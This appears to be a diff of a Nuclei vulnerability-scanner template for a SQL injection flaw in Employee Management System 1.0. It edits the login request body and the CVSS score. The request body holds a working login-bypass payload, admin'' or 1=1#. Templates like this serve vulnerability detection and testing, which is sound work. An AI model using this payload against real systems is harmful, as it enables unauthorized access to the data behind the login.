@@ -21,7 +21,7 @@ http:
     Content-Type: application/x-www-form-urlencoded
 
 
-    mailuid=admin'' or 1=1#&pwd=nuclei&login-submit=Login
+    mailuid=admin'' or 1=1#&pwd={{rand_base(5)}}&login-submit=Login
 
     '
 id: ems-sqli
@@ -29,7 +29,7 @@ info:
   author: arafatansari
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10.0
+    cvss-score: 10
     cwe-id: CWE-89
   description: 'Employee Management System 1.0 contains a SQL injection vulnerability
     via the username parameter.  An attacker can possibly obtain sensitive information
